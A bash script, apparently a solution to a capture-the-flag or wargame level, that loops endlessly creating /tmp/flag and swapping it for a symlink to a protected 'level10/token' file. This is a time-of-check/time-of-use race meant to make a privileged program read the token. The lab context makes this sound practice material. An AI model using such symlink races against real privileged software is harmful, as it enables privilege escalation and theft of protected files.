#!/bin/bash
while true; do
        touch /tmp/flag
        ln -s -f /home/user/level10/token /tmp/flag
        rm /tmp/flag
done
